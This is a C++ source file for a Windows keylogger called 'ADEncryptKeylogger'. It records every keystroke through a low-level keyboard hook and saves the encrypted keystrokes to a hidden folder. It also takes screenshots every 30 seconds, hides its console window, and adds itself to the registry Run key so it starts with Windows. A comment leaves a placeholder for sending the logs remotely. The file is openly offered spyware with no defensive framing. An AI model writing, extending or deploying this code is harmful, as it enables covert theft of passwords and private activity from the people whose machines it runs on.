#define UNICODE
#include <Windows.h>
#include <fstream>
#include <iostream>
#include <string>
#include <ctime>
#include <thread>
#include <mutex>
#include <wincrypt.h>
#include <gdiplus.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

// Configuration Macros
#define LOG_FILE_SIZE 2048   // Max log size in KB before sending
#define AES_KEY_SIZE 256     // AES encryption key size
#define SCREENSHOT_INTERVAL 30 // Take screenshot every 30 seconds

std::mutex logMutex;
std::ofstream logFile;
std::string logBuffer;
HHOOK keyboardHook;
ULONG_PTR gdiplusToken;
std::string folderPath = "C:\\ADEncrypt\\";

// Initialize GDI+ for screenshots
void InitGDIPlus() {
    GdiplusStartupInput gdiInput;
    GdiplusStartup(&gdiplusToken, &gdiInput, NULL);
}

// AES Encryption Function
std::string EncryptLogs(const std::string &data) {
    DATA_BLOB DataIn, DataOut;
    DataIn.pbData = (BYTE *)data.c_str();
    DataIn.cbData = data.length() + 1;
    if (CryptProtectData(&DataIn, L"Keylog", NULL, NULL, NULL, 0, &DataOut)) {
        std::string encrypted((char *)DataOut.pbData, DataOut.cbData);
        LocalFree(DataOut.pbData);
        return encrypted;
    }
    return "";
}

// Capture Screenshot
void CaptureScreenshot() {
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hScreen);

    CLSID clsid;
    GetEncoderClsid(L"image/png", &clsid);
    Gdiplus::Bitmap bitmap(hBitmap, NULL);
    bitmap.Save(L"screenshot.png", &clsid, NULL);

    DeleteObject(hBitmap);
    DeleteDC(hDC);
}

// Log Key Press
void LogKey(int key) {
    std::lock_guard<std::mutex> guard(logMutex);
    logBuffer += (char)key;
    if (logBuffer.size() >= LOG_FILE_SIZE) {
        logFile << EncryptLogs(logBuffer);
        logFile.flush();
        logBuffer.clear();
    }
}

// Hook Callback
LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        LogKey(kbdStruct->vkCode);
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// Set Keyboard Hook
void SetHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
    if (!keyboardHook) {
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
        exit(1);
    }
}

// Remove Hook
void RemoveHook() {
    UnhookWindowsHookEx(keyboardHook);
}

// Add to Registry for Auto Startup
void AddToStartup() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "ADEncryptKeylogger", 0, REG_SZ, (const BYTE*)szPath, strlen(szPath) + 1);
        RegCloseKey(hKey);
    }
}

// Hide Console Window
void HideConsoleWindow() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

// Ensure the Folder Exists
void EnsureFolderExists() {
    if (CreateDirectoryA(folderPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        logFile.open(folderPath + "logs.txt", std::ios::app);
    }
}

// Main Thread
int main() {
    // Ensure folder exists
    EnsureFolderExists();

    // Add to registry for auto startup
    AddToStartup();

    // Initialize GDI+ for screenshots
    InitGDIPlus();

    // Hide console window
    HideConsoleWindow();

    // Set up the keylogger hook
    SetHook();

    // Log thread
    std::thread logThread([]() {
        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
            // You can implement code here to send logs remotely or store encrypted locally
        }
    });
    logThread.detach();

    // Screenshot thread
    std::thread screenshotThread([]() {
        while (true) {
            std::this_thread::sleep_for(std::chrono::seconds(SCREENSHOT_INTERVAL));
            CaptureScreenshot();
        }
    });
    screenshotThread.detach();

    // Main message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up
    RemoveHook();
    return 0;
}
